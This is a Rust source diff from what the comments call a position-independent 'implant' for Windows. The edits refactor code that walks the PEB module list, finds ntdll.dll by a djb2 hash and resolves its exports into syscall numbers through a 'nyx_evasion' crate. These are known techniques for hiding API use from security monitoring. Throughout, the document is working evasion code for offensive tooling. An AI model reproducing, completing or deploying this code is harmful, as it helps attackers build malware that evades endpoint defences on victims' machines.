@@ -18,6 +18,8 @@
 
 #![cfg(target_os = "windows")]
 
+use crate::heap::{self, vec, String, Vec};
+type HeapStr = heap::Str;
 use core::ffi::c_void;
 
 /// djb2 hash of a byte string (case-insensitive for module names, as Windows
@@ -86,7 +88,7 @@ impl Module {
 
     /// (name, rva) for every named export — used to feed the SSN resolver's
     /// `SyscallSource::exports()`. Allocates a Vec, so the heap must be up.
-    pub fn named_exports(&self) -> Vec<(heap::Str, u32)> {
+    pub fn named_exports(&self) -> Vec<(HeapStr, u32)> {
         let dir = self.export_dir();
         let mut out = Vec::new();
         if dir.is_null() {
@@ -102,14 +104,14 @@ impl Module {
             for i in 0..n {
                 let name_rva = *names.add(i);
                 let name_ptr = base.add(name_rva as usize);
-                // Read the C string into a heap::Str.
+                // Read the C string into a HeapStr.
                 let mut len = 0usize;
                 while *name_ptr.add(len) != 0 {
                     len += 1;
                 }
                 let slice = core::slice::from_raw_parts(name_ptr, len);
                 let ord = *ordinals.add(i) as usize;
-                out.push((heap::Str::from_bytes(slice), *funcs.add(ord)));
+                out.push((HeapStr::from_bytes(slice), *funcs.add(ord)));
             }
         }
         out
@@ -138,7 +140,7 @@ pub struct ExportDirectory {
 pub struct LiveNtdll {
     module: Module,
     /// Cached (name, rva) list (built once, borrowed for the lifetime of self).
-    exports: Vec<(heap::Str, u32)>,
+    exports: Vec<(HeapStr, u32)>,
 }
 
 impl LiveNtdll {
@@ -146,7 +148,8 @@ impl LiveNtdll {
     /// its export directory. Returns None if ntdll can't be found (should not
     /// happen in a real process — ntdll is always loaded).
     pub fn locate() -> Option<Self> {
-        let module = find_module_by_hash(djb2(b"ntdll.dll"))?;
+        // SAFETY: PEB walk reads process-global state that is stable post-load.
+        let module = unsafe { find_module_by_hash(djb2(b"ntdll.dll")) }?;
         let exports = module.named_exports();
         Some(Self { module, exports })
     }
@@ -165,7 +168,7 @@ impl nyx_evasion::SyscallSource for LiveNtdll {
         }
     }
     fn exports(&self) -> &[(String, u32)] {
-        // The evasion trait wants &[String]; our cache holds heap::Str. We can't
+        // The evasion trait wants &[String]; our cache holds HeapStr. We can't
         // produce a &[String] without a conversion allocation that outlives the
         // call, so the resolver is invoked via a wrapper that owns Strings.
         // (See `resolve_table_owned` — the canonical entry point.)
@@ -193,7 +196,7 @@ impl LiveNtdll {
 /// A SyscallSource backed by String names (so the trait method is satisfiable).
 struct OwnedSyscallSource<'a> {
     base: *mut u8,
-    exports: &'a [(heap::Str, u32)],
+    exports: &'a [(HeapStr, u32)],
 }
 
 impl<'a> nyx_evasion::SyscallSource for OwnedSyscallSource<'a> {
@@ -204,7 +207,7 @@ impl<'a> nyx_evasion::SyscallSource for OwnedSyscallSource<'a> {
         }
     }
     fn exports(&self) -> &[(String, u32)] {
-        // We can't return &[String] from heap::Str without allocation; the
+        // We can't return &[String] from HeapStr without allocation; the
         // resolver only iterates, so we expose names via a thread-local cache.
         // To keep this simple and allocation-bounded, we materialize on demand
         // into a static buffer (single-threaded PIC; safe).
@@ -212,23 +215,20 @@ impl<'a> nyx_evasion::SyscallSource for OwnedSyscallSource<'a> {
     }
 }
 
-thread_local! {
-    static EXPORT_CACHE: core::cell::RefCell<Vec<(String, u32)>> = core::cell::RefCell::new(Vec::new());
-}
+// PIC is single-threaded at boot, so a process-global mutable buffer is safe.
+// (thread_local! needs std; under #![no_std] we use a static mut.)
+static mut EXPORT_CACHE: Vec<(String, u32)> = Vec::new();
 
-fn materialize_exports(src: &[(heap::Str, u32)]) -> &[(String, u32)] {
-    EXPORT_CACHE.with(|c| {
-        let mut v = c.borrow_mut();
-        v.clear();
-        v.reserve(src.len());
+fn materialize_exports(src: &[(HeapStr, u32)]) -> &'static [(String, u32)] {
+    // SAFETY: PIC implant is single-threaded during resolve; no concurrent access.
+    unsafe {
+        EXPORT_CACHE.clear();
+        EXPORT_CACHE.reserve(src.len());
         for (name, rva) in src {
-            v.push((name.to_string_lossy(), *rva));
+            EXPORT_CACHE.push((name.to_string_lossy(), *rva));
         }
-        // Return a borrow with the lifetime of the cache; safe because PIC is
-        // single-threaded and resolve_table is a synchronous call.
-        let ptr: *const (String, u32) = v.as_ptr();
-        unsafe { core::slice::from_raw_parts(ptr, v.len()) }
-    })
+        core::slice::from_raw_parts(EXPORT_CACHE.as_ptr(), EXPORT_CACHE.len())
+    }
 }
 
 /// Walk the PEB's InLoadOrderModuleList to find a loaded module by name hash.
@@ -241,10 +241,12 @@ unsafe fn find_module_by_hash(name_hash: u32) -> Option<Module> {
     let mut head = (*ldr).in_load_order_module_list.flink;
     let list_start: *const u8 = &(*ldr).in_load_order_module_list as *const _ as *const u8;
     while head as *const u8 != list_start {
-        let entry = &mut *(*head).entry();
-        // BufferName holds the DLL base name (UTF-16). Hash it as bytes.
-        let name_buf = entry.base_dll_name.buffer;
-        let name_len = entry.base_dll_name.length as usize / 2; // bytes->chars
+        // in_load_order_links is the first field of ListEntry, so the address of
+        // the ListHead == the address of the containing ListEntry (CONTAINING_RECORD
+        // with offset 0). Cast directly.
+        let entry: *mut ListEntry = head as *mut ListEntry;
+        let name_buf = (*entry).base_dll_name.buffer;
+        let name_len = (*entry).base_dll_name.length as usize / 2; // bytes->chars
         if !name_buf.is_null() && name_len > 0 {
             let chars = core::slice::from_raw_parts(name_buf, name_len);
             // djb2 over the UTF-16 low bytes (ASCII module names fit in low byte).
@@ -254,10 +256,10 @@ unsafe fn find_module_by_hash(name_hash: u32) -> Option<Module> {
                 h = h.wrapping_mul(33).wrapping_add(lo.to_ascii_lowercase() as u32);
             }
             if h == name_hash {
-                return Some(parse_module(entry.dll_base as *mut u8));
+                return Some(parse_module((*entry).dll_base as *mut u8));
             }
         }
-        head = entry.in_load_order_links.flink;
+        head = (*entry).in_load_order_links.flink;
     }
     None
 }
@@ -308,13 +310,10 @@ pub struct ListEntry {
     pub base_dll_name: UnicodeString,
 }
 
-impl ListEntry {
-    /// Recover the containing entry from a pointer to its in_load_order_links.
-    /// offsetof(ListEntry, in_load_order_links) == 0, so the cast is identity.
-    pub unsafe fn entry(self: *mut ListHead) -> *mut ListEntry {
-        self as *mut ListEntry
-    }
-}
+// Note: there is no CONTAINING_RECORD helper method here. Because
+// in_load_order_links is the first field of ListEntry, the address of the
+// ListHead (flink target) IS the address of the ListEntry — callers cast the
+// raw pointer directly (see find_module_by_hash).
 
 #[repr(C)]
 #[derive(Clone, Copy)]
